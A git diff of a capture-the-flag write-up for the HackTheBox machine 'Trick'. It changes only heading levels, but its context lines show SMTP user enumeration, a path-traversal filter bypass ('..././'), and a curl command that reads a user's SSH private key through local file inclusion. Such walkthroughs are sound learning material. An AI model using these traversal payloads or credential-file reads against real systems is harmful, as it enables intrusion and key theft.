@@ -1,4 +1,4 @@
-## Enumeration
+### Enumeration
 ```bash
 22 - OpenSSH 7.9p1 Debian 10+deb10u2
 25 - Postfix
@@ -32,7 +32,7 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
 ;; XFR size: 6 records (messages 1, bytes 231)
 ```
 
-## SMTP
+### SMTP
 I went on a little bit of a rabbit hole with the SMTP server, but it wasn't completely useless  
 I wrote this little python script, who attempts to find valid mail users, by bruteforcing VRFY  
 ```python
@@ -64,7 +64,7 @@ python3 smtp_brute.py
 (252, b'2.0.0 michael')
 ```
 
-## SQLi
+### SQLi
 [http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb)  
   
 we saw the the payroll portal from the dig earlier, but it can be found using gobuster vhost too
@@ -135,13 +135,13 @@ else{
 ```
 This points us to an LFI as the above can be evaded like this ..././..././..././  
 
-## LFI
+### LFI
 So we can now just dump michael's key, and get user access  
 ```bash
 curl 'http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa' -o michael.pem
 ```
 
-## Fail2Ban privesc
+### Fail2Ban privesc
 It is imediately apparent that the privesc will be something with fail2ban  
 the makers of the box are hinting us to it in a few different ways  
 there is a fail2ban config file in michael's home folder 
